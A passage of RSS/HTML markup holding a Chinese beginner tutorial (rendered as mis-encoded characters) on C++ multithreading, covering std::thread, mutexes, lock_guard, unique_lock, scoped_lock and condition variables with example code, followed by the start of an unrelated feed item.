                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»6åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>å¤šçº¿ç¨‹å¼€å‘åœºæ™¯åŸºæœ¬æ˜¯æ¯ä¸€ä¸ªC++å¼€å‘å·¥ç¨‹å¸ˆæ— æ³•é¿å…çš„åœºæ™¯,ä»Šå¤©å°±å¸¦å¤§å®¶ä»é›¶åŸºç¡€å…¥é—¨C++å¤šçº¿ç¨‹ç¼–ç¨‹,æŒæ¡å…¶ä¸­çš„åŸºç¡€ç”¨æ³•ã€é”ç®¡ç†å·¥å…·å’Œæ¡ä»¶å˜é‡çš„å†…å®¹</p>
<h2 data-id="heading-0">å¤šçº¿ç¨‹çš„è®¤è¯†</h2>
<p>å¤šçº¿ç¨‹å°±æ˜¯ä¸€ä¸ªç¨‹åºå†…éƒ¨è¿è¡Œå¤šä¸ªä»»åŠ¡,æ¯ä¸ªä»»åŠ¡å°±æ˜¯ä¸€ä¸ªçº¿ç¨‹,å……åˆ†åˆ©ç”¨CPUçš„èµ„æº,æé«˜æ•ˆç‡çš„æŠ€æœ¯</p>
<p>åœ¨å¤šä¸ªçº¿ç¨‹ä¸­,ä½œä¸ºç¨‹åºå…¥å£çš„çº¿ç¨‹ç§°ä¸º<code>ä¸»çº¿ç¨‹</code>,ç”±ä¸»çº¿ç¨‹åˆ›å»ºè´Ÿè´£ç‹¬ç«‹æ‰§è¡Œç»†åˆ†ä»»åŠ¡çš„çº¿ç¨‹ç§°ä¸º<code>å­çº¿ç¨‹</code></p>
<h2 data-id="heading-1">å®ç°ä¾èµ–</h2>
<p>åœ¨C++ä¸­æƒ³ä½¿ç”¨å¤šçº¿ç¨‹æŠ€æœ¯,å°±è¦å¼•å…¥å¤´æ–‡ä»¶<code>&lt;thread&gt;</code></p>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;thread&gt;</span></span>
</code></pre>
<h2 data-id="heading-2">çº¿ç¨‹åˆ›å»ºåŸºæœ¬æµç¨‹</h2>
<p>é¦–å…ˆè¦å®šä¹‰çº¿ç¨‹è¦æ‰§è¡Œçš„ä»»åŠ¡å‡½æ•°,ç„¶åè¦é€šè¿‡<code>std::thread</code>å®ä¾‹åŒ–çº¿ç¨‹å¯¹è±¡å¹¶ä¸”ç»‘å®šè¯¥ä»»åŠ¡å‡½æ•°,æœ€åè°ƒç”¨<code>join()</code>å‡½æ•°æˆ–è€…<code>detach()</code>å‡½æ•°</p>
<p>å…¶ä¸­<code>join()</code>æ¥é˜»å¡ä¸»çº¿ç¨‹,ç­‰å¾…å­çº¿ç¨‹æ‰§è¡Œå®Œæ¯•;<code>detach()</code>æ¥å°†ä¸»çº¿ç¨‹å’Œå­çº¿ç¨‹åˆ†ç¦»</p>
<p>ä»£ç ç¤ºä¾‹å¦‚ä¸‹</p>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;thread&gt;</span></span>

<span class="hljs-comment">// å­çº¿ç¨‹ä»»åŠ¡å‡½æ•°</span>
<span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">task</span><span class="hljs-params">(<span class="hljs-type">int</span> num)</span> </span>{
    cout &lt;&lt; <span class="hljs-string">"å­çº¿ç¨‹æ‰§è¡Œä»»åŠ¡ï¼Œä¼ å…¥å‚æ•°ï¼š"</span> &lt;&lt; num &lt;&lt; endl;
}

<span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>{
    <span class="hljs-comment">// å®ä¾‹åŒ–threadå¯¹è±¡å¹¶ç»‘å®šä»»åŠ¡ï¼Œä¼ å…¥å‚æ•°5</span>
    <span class="hljs-function">std::thread <span class="hljs-title">t</span><span class="hljs-params">(task, <span class="hljs-number">5</span>)</span></span>;
    
    <span class="hljs-comment">// é˜»å¡ä¸»çº¿ç¨‹ï¼Œç­‰å¾…å­çº¿ç¨‹æ‰§è¡Œå®Œæˆ</span>
    t.<span class="hljs-built_in">join</span>();
    
    std::cout &lt;&lt; <span class="hljs-string">"ä¸»çº¿ç¨‹ç»§ç»­æ‰§è¡Œ"</span> &lt;&lt; std::endl;
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
}
</code></pre>
<p>ä¸ºä»€ä¹ˆè¦è°ƒç”¨<code>join(</code>æˆ–<code>detach()</code>å‡½æ•°å‘¢,å¦‚æœä¸è°ƒç”¨çº¿ç¨‹åœ¨å¯¹è±¡ææ„æ—¶ä¼šè§¦å‘ç¨‹åºå¼‚å¸¸ç»ˆæ­¢</p>
<h2 data-id="heading-3">äº’æ–¥é”</h2>
<p>å½“å¤šä¸ªçº¿ç¨‹è®¿é—®åŒä¸€å—å…±äº«å†…å­˜æ—¶,ä¼šå‡ºç°æ•°æ®è¯»å†™æ··ä¹±çš„æƒ…å†µ,è¿™å°±æ˜¯ç«æ€æ¡ä»¶,ä¸ºäº†è§£å†³è¿™ä¸ªé—®é¢˜,å¯ä»¥é‡‡ç”¨äº’æ–¥é”<code>std::mutex</code></p>
<p><code>std::mutex</code>çš„æ ¸å¿ƒæ¥å£æ˜¯<br/>
<code>lock()</code>,<code>unlock()</code>,<code>try_lock()</code></p>
<p><code>lock()</code>ç»™äº’æ–¥é”åŠ é”ï¼Œè‹¥é”å·²è¢«å…¶ä»–çº¿ç¨‹æŒæœ‰ï¼Œåˆ™å½“å‰çº¿ç¨‹ä¼šé˜»å¡ï¼Œç›´åˆ°è·å–åˆ°é”,å¿…é¡»ç¡®ä¿åªæœ‰æŒ<code>unlock()</code>æ˜¯é‡Šæ”¾é”,ç¡®ä¿åªæœ‰æŒæœ‰é”çš„çº¿ç¨‹æ‰èƒ½è°ƒç”¨,<code>try_lock()</code>æ˜¯å°è¯•åŠ é”ï¼ŒæˆåŠŸè¿”å›trueï¼Œå¤±è´¥è¿”å›falseï¼Œä¸ä¼šé˜»å¡å½“å‰çº¿ç¨‹</p>
<p>ä»£ç ç¤ºä¾‹</p>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;thread&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;mutex&gt;</span></span>

std::mutex mtx;  <span class="hljs-comment">// å®šä¹‰å…¨å±€äº’æ–¥é”</span>
<span class="hljs-type">int</span> shared_counter = <span class="hljs-number">0</span>;  <span class="hljs-comment">// å…±äº«èµ„æº</span>

<span class="hljs-comment">// å­çº¿ç¨‹ä»»åŠ¡ï¼šå¯¹å…±äº«è®¡æ•°å™¨è¿›è¡Œç´¯åŠ </span>
<span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">increment_counter</span><span class="hljs-params">()</span> </span>{
    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">1000</span>; i++) {
        mtx.<span class="hljs-built_in">lock</span>();  <span class="hljs-comment">// åŠ é”ï¼Œè¿›å…¥ä¸´ç•ŒåŒº</span>
        shared_counter++;
        mtx.<span class="hljs-built_in">unlock</span>();  <span class="hljs-comment">// è§£é”ï¼Œé€€å‡ºä¸´ç•ŒåŒº</span>
    }
}

<span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>{
    <span class="hljs-function">std::thread <span class="hljs-title">t1</span><span class="hljs-params">(increment_counter)</span></span>;
    <span class="hljs-function">std::thread <span class="hljs-title">t2</span><span class="hljs-params">(increment_counter)</span></span>;

    t1.<span class="hljs-built_in">join</span>();
    t2.<span class="hljs-built_in">join</span>();

    std::cout &lt;&lt; <span class="hljs-string">"æœ€ç»ˆè®¡æ•°å™¨å€¼ï¼š"</span> &lt;&lt; shared_counter &lt;&lt; std::endl;  <span class="hljs-comment">// é¢„æœŸè¾“å‡º2000</span>
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
}
</code></pre>
<p>äº’æ–¥é”è™½ç„¶å¯ä»¥è§£å†³ç«æ€æ¡ä»¶é—®é¢˜,ä½†éœ€è¦éœ€æ‰‹åŠ¨è°ƒç”¨<code>lock()</code>å’Œ<code>unlock()</code>,è‹¥ä¸´ç•ŒåŒºä»£ç æŠ›å‡ºå¼‚å¸¸ï¼Œä¼šå¯¼è‡´unlock()æ— æ³•æ‰§è¡Œï¼Œè¿›è€Œå¼•å‘æ­»é”,è€Œä¸”å¤šé”åœºæ™¯ä¸‹ï¼Œè‹¥åŠ é”é¡ºåºä¸ä¸€è‡´ï¼Œææ˜“å‡ºç°æ­»é”é—®é¢˜,æ“ä½œéš¾åº¦å¤ªå¤§,å› è€Œå°±æœ‰äº†è®©äº’æ–¥é”æ›´å®‰å…¨çµæ´»çš„<code>é”ç®¡ç†å·¥å…·</code></p>
<h2 data-id="heading-4">é”ç®¡ç†å·¥å…·</h2>
<p>é”ç®¡ç†å·¥å…·ä¸»è¦æœ‰ä¸‰ç§:åˆ†åˆ«æ˜¯<code>å®ˆå«é”</code>,<code>å”¯ä¸€é”</code>,<code>ä½œç”¨åŸŸé”</code></p>
<h3 data-id="heading-5">std::lock_guardï¼ˆå®ˆå«é”ï¼‰</h3>
<p><code>std::lock_guard</code>æ˜¯æœ€è½»é‡åŒ–çš„<code>RAII é”ç®¡ç†å·¥å…·</code>,æ„é€ æ—¶è‡ªåŠ¨è°ƒç”¨<code>lock()</code>åŠ é”ï¼Œææ„æ—¶è‡ªåŠ¨è°ƒç”¨<code>unlock()</code>è§£é”</p>
<p>é€‚ç”¨äºç®€å•çš„ä¸´ç•ŒåŒºèµ„æºä¿æŠ¤ï¼Œæ— éœ€æ‰‹åŠ¨æ§åˆ¶åŠ è§£é”æ—¶æœº,ä»¥ä¸‹æ˜¯ä»£ç ç¤ºä¾‹:</p>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;thread&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;mutex&gt;</span></span>

std::mutex mtx;
<span class="hljs-type">int</span> shared_num = <span class="hljs-number">0</span>;

<span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">add_num</span><span class="hljs-params">()</span> </span>{
    <span class="hljs-comment">// æ„é€ lock_guardæ—¶è‡ªåŠ¨åŠ é”</span>
    <span class="hljs-function">std::lock_guard&lt;std::mutex&gt; <span class="hljs-title">lock</span><span class="hljs-params">(mtx)</span></span>;
    shared_num++;
    std::cout &lt;&lt; <span class="hljs-string">"å½“å‰å…±äº«å˜é‡å€¼ï¼š"</span> &lt;&lt; shared_num &lt;&lt; std::endl;
    <span class="hljs-comment">// å‡½æ•°ç»“æŸï¼Œlock_guardææ„è‡ªåŠ¨è§£é”ï¼Œå³ä½¿ä¸­é€”æŠ›å¼‚å¸¸ä¹Ÿèƒ½æ­£å¸¸è§£é”</span>
}

<span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>{
    <span class="hljs-function">std::thread <span class="hljs-title">t1</span><span class="hljs-params">(add_num)</span></span>;
    <span class="hljs-function">std::thread <span class="hljs-title">t2</span><span class="hljs-params">(add_num)</span></span>;
    t1.<span class="hljs-built_in">join</span>();
    t2.<span class="hljs-built_in">join</span>();
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
}
</code></pre>
<h3 data-id="heading-6">std::unique_lockï¼ˆå”¯ä¸€é”ï¼‰</h3>
<p><code>std::unique_lock</code>æ˜¯æœ€çµæ´»çš„<code> RAII é”ç®¡ç†å·¥å…·</code>ï¼Œæ”¯æŒæ‰‹åŠ¨åŠ è§£é”ã€è¶…æ—¶ç­‰å¾…ã€å»¶è¿ŸåŠ é”ç­‰æ“ä½œ,å¹¶ä¸”å¯é…åˆæ¡ä»¶å˜é‡ä½¿ç”¨</p>
<p>é€‚ç”¨äºå¤æ‚çš„é”æ§åˆ¶åœºæ™¯ï¼Œéœ€è¦çµæ´»è°ƒæ•´åŠ è§£é”æ—¶æœº,ä»£ç ç¤ºä¾‹å¦‚ä¸‹:</p>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;thread&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;mutex&gt;</span></span>

std::mutex mtx;
<span class="hljs-type">int</span> count = <span class="hljs-number">0</span>;

<span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">task</span><span class="hljs-params">()</span> </span>{
    <span class="hljs-function">std::unique_lock&lt;std::mutex&gt; <span class="hljs-title">lock</span><span class="hljs-params">(mtx, std::defer_lock)</span></span>; <span class="hljs-comment">// å»¶è¿ŸåŠ é”ï¼Œæ„é€ æ—¶ä¸è‡ªåŠ¨åŠ é”</span>
    <span class="hljs-comment">// æ‰‹åŠ¨åŠ é”</span>
    lock.<span class="hljs-built_in">lock</span>();
    count += <span class="hljs-number">5</span>;
    std::cout &lt;&lt; <span class="hljs-string">"countæ›´æ–°ä¸ºï¼š"</span> &lt;&lt; count &lt;&lt; std::endl;
    <span class="hljs-comment">// æ‰‹åŠ¨è§£é”</span>
    lock.<span class="hljs-built_in">unlock</span>();
    
    <span class="hljs-comment">// å¯å†æ¬¡åŠ é”</span>
    lock.<span class="hljs-built_in">lock</span>();
    count += <span class="hljs-number">3</span>;
    std::cout &lt;&lt; <span class="hljs-string">"countæœ€ç»ˆå€¼ï¼š"</span> &lt;&lt; count &lt;&lt; std::endl;
}

<span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>{
    <span class="hljs-function">std::thread <span class="hljs-title">t</span><span class="hljs-params">(task)</span></span>;
    t.<span class="hljs-built_in">join</span>();
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
}
</code></pre>
<h3 data-id="heading-7">std::scoped_lockï¼ˆä½œç”¨åŸŸé”ï¼‰</h3>
<p><code>std::scoped_lock</code>æ˜¯ä¸“ä¸ºå¤šé”åœºæ™¯è®¾è®¡çš„<code>RAIIç®¡ç†å·¥å…·</code>ï¼Œèƒ½è‡ªåŠ¨å¯¹ä¼ å…¥çš„å¤šä¸ªäº’æ–¥é”æ’åºåŠ é”ï¼Œä»æ ¹æºæœç»å¤šé”æ­»é”é—®é¢˜</p>
<p>é€‚ç”¨äºéœ€è¦åŒæ—¶è·å–å¤šä¸ªäº’æ–¥é”çš„åœºæ™¯,ä»£ç ç¤ºä¾‹å¦‚ä¸‹:</p>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;thread&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;mutex&gt;</span></span>

std::mutex mtx1, mtx2;
<span class="hljs-type">int</span> data1 = <span class="hljs-number">0</span>, data2 = <span class="hljs-number">0</span>;

<span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">update_data</span><span class="hljs-params">()</span> </span>{
    <span class="hljs-comment">// è‡ªåŠ¨å¯¹mtx1ã€mtx2æ’åºåŠ é”ï¼Œé¿å…æ­»é”</span>
    <span class="hljs-function">std::scoped_lock <span class="hljs-title">lock</span><span class="hljs-params">(mtx1, mtx2)</span></span>;
    data1++;
    data2++;
    std::cout &lt;&lt; <span class="hljs-string">"data1="</span> &lt;&lt; data1 &lt;&lt; <span class="hljs-string">"ï¼Œdata2="</span> &lt;&lt; data2 &lt;&lt; std::endl;
}

<span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>{
    <span class="hljs-function">std::thread <span class="hljs-title">t1</span><span class="hljs-params">(update_data)</span></span>;
    <span class="hljs-function">std::thread <span class="hljs-title">t2</span><span class="hljs-params">(update_data)</span></span>;
    t1.<span class="hljs-built_in">join</span>();
    t2.<span class="hljs-built_in">join</span>();
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
}
</code></pre>
<h2 data-id="heading-8">æ¡ä»¶å˜é‡</h2>
<p><code>std::condition_variable</code>ï¼ˆæ¡ä»¶å˜é‡ï¼‰æ˜¯ C++ å¤šçº¿ç¨‹ä¸­å®ç°çº¿ç¨‹é˜»å¡ç­‰å¾…çš„æ ¸å¿ƒå·¥å…·ï¼Œå®ƒå…è®¸çº¿ç¨‹é˜»å¡è‡³ç‰¹å®šæ¡ä»¶æ»¡è¶³åå†è¢«å”¤é†’ï¼Œé¿å…äº† â€œå¿™ç­‰â€ å¸¦æ¥çš„ CPU èµ„æºæµªè´¹</p>
<h3 data-id="heading-9">æ ¸å¿ƒç‰¹æ€§</h3>
<p><strong>é˜»å¡ç­‰å¾…</strong>ï¼šçº¿ç¨‹è°ƒç”¨<code>wait()</code>åä¼šé‡Šæ”¾æŒæœ‰çš„äº’æ–¥é”ï¼Œè¿›å…¥é˜»å¡çŠ¶æ€ï¼Œç›´åˆ°è¢«å…¶ä»–çº¿ç¨‹å”¤é†’</p>
<p><strong>å”¤é†’æœºåˆ¶</strong>ï¼šé€šè¿‡<code>notify_one()</code>å”¤é†’ä¸€ä¸ªç­‰å¾…çº¿ç¨‹ï¼Œæˆ–<code>notify_all()</code>å”¤é†’æ‰€æœ‰ç­‰å¾…çº¿ç¨‹</p>
<p><strong>ç»‘å®šäº’æ–¥é”</strong>ï¼šå¿…é¡»é…åˆ<code>std::unique_lock&lt;std::mutex&gt;</code>ä½¿ç”¨ï¼Œæ— æ³•ç›´æ¥æ­é…å…¶ä»–é”</p>
<p><strong>è™šå‡å”¤é†’</strong>ï¼šå³ä½¿æœªè¢«ä¸»åŠ¨å”¤é†’ï¼Œç­‰å¾…çº¿ç¨‹ä¹Ÿå¯èƒ½è¢«å”¤é†’ï¼Œå› æ­¤éœ€åœ¨å¾ªç¯ä¸­æ£€æŸ¥æ¡ä»¶æ˜¯å¦çœŸçš„æ»¡è¶³</p>
<p>é€‚ç”¨äºç”Ÿäº§è€… - æ¶ˆè´¹è€…æ¨¡å‹ï¼šé˜Ÿåˆ—æ»¡æˆ–è€…ç©ºæ—¶è®©å¯¹åº”çº¿ç¨‹ç­‰å¾…,çº¿ç¨‹æ± ,å¤šçº¿ç¨‹åŒæ­¥ç­‰å¾…æŸä¸ªäº‹ä»¶è§¦å‘å’Œè¶…æ—¶ç­‰å¾…åœºæ™¯ç­‰åœºæ™¯,ä»£ç ç¤ºä¾‹å¦‚ä¸‹:</p>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;thread&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;mutex&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;condition_variable&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;queue&gt;</span></span>

std::queue&lt;<span class="hljs-type">int</span>&gt; task_queue;
std::mutex mtx;
std::condition_variable cv;

<span class="hljs-comment">// ç”Ÿäº§è€…ï¼šå¾€é˜Ÿåˆ—ä¸­æ·»åŠ ä»»åŠ¡</span>
<span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">producer</span><span class="hljs-params">()</span> </span>{
    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= <span class="hljs-number">5</span>; i++) {
        <span class="hljs-function">std::unique_lock&lt;std::mutex&gt; <span class="hljs-title">lock</span><span class="hljs-params">(mtx)</span></span>;
        task_queue.<span class="hljs-built_in">push</span>(i);
        std::cout &lt;&lt; <span class="hljs-string">"ç”Ÿäº§è€…ç”Ÿäº§ä»»åŠ¡ï¼š"</span> &lt;&lt; i &lt;&lt; std::endl;
        lock.<span class="hljs-built_in">unlock</span>();
        <span class="hljs-comment">// å”¤é†’ä¸€ä¸ªæ¶ˆè´¹è€…çº¿ç¨‹</span>
        cv.<span class="hljs-built_in">notify_one</span>();
        std::this_thread::<span class="hljs-built_in">sleep_for</span>(std::chrono::<span class="hljs-built_in">milliseconds</span>(<span class="hljs-number">500</span>));
    }
}

<span class="hljs-comment">// æ¶ˆè´¹è€…ï¼šä»é˜Ÿåˆ—ä¸­å–ä»»åŠ¡æ‰§è¡Œ</span>
<span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">consumer</span><span class="hljs-params">()</span> </span>{
    <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>) {
        <span class="hljs-function">std::unique_lock&lt;std::mutex&gt; <span class="hljs-title">lock</span><span class="hljs-params">(mtx)</span></span>;
        <span class="hljs-comment">// å¾ªç¯æ£€æŸ¥æ¡ä»¶ï¼Œé¿å…è™šå‡å”¤é†’</span>
        cv.<span class="hljs-built_in">wait</span>(lock, []{ <span class="hljs-keyword">return</span> !task_queue.<span class="hljs-built_in">empty</span>(); });
        
        <span class="hljs-type">int</span> task = task_queue.<span class="hljs-built_in">front</span>();
        task_queue.<span class="hljs-built_in">pop</span>();
        std::cout &lt;&lt; <span class="hljs-string">"æ¶ˆè´¹è€…æ‰§è¡Œä»»åŠ¡ï¼š"</span> &lt;&lt; task &lt;&lt; std::endl;
        lock.<span class="hljs-built_in">unlock</span>();
        
        <span class="hljs-keyword">if</span> (task == <span class="hljs-number">5</span>) <span class="hljs-keyword">break</span>; <span class="hljs-comment">// ä»»åŠ¡æ‰§è¡Œå®Œæ¯•é€€å‡º</span>
    }
}

<span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>{
    <span class="hljs-function">std::thread <span class="hljs-title">prod</span><span class="hljs-params">(producer)</span></span>;
    <span class="hljs-function">std::thread <span class="hljs-title">cons</span><span class="hljs-params">(consumer)</span></span>;
    
    prod.<span class="hljs-built_in">join</span>();
    cons.<span class="hljs-built_in">join</span>();
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
}
</code></pre>
<h2 data-id="heading-10">æ€»ç»“</h2>
<p><code>å¤šçº¿ç¨‹</code>æ˜¯é€šè¿‡åœ¨ç¨‹åºä¸­åˆ›å»ºå¤šä¸ªçº¿ç¨‹,å¹¶ä¸”ç»“åˆ<code>äº’æ–¥é”</code>ä»¥åŠ<code>é”ç®¡ç†å·¥å…·</code>å’Œ<code>æ¡ä»¶å˜é‡</code>æ¥å®ç°CPUåˆ©ç”¨æ•ˆç‡çš„æé«˜,åœ¨çŸ­æ—¶é—´å†…è·‘å®Œå¤šä¸ªä»»åŠ¡çš„æŠ€æœ¯,æ˜¯æˆ‘ä»¬æ¯ä¸ªC++ç¨‹åºå‘˜ç»•ä¸å¼€çš„æŠ€æœ¯</p>
<p>è§‰å¾—æ–‡ç« å¯¹æ‚¨æœ‰å¸®åŠ©çš„è¯å¯ä»¥ç‚¹èµå…³æ³¨,æˆ‘å°†ä¼šæŒç»­åˆ†äº«é«˜è´¨é‡çš„å†…å®¹~</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[åŸºäºSpreadJSçš„ååŒå¡«æŠ¥åº”ç”¨ | è‘¡è„åŸæŠ€æœ¯å›¢é˜Ÿ]]></title>    <link>https://juejin.cn/post/7581741663183323171</link>    <guid>https://juejin.cn/post/7581741663183323171</guid>    <pubDate>2025-12-10T01:54:26.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581741663183323171" data-draft-id="7581741663183306787" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="åŸºäºSpreadJSçš„ååŒå¡«æŠ¥åº”ç”¨ | è‘¡è„åŸæŠ€æœ¯å›¢é˜Ÿ"/> <meta itemprop="keywords" content="å‰ç«¯"/> <meta itemprop="datePublished" content="2025-12-10T01:54:26.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="è‘¡è„åŸæŠ€æœ¯å›¢é˜Ÿ"/> <meta itemprop="url" content="https://juejin.cn/user/3227821868332765"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" 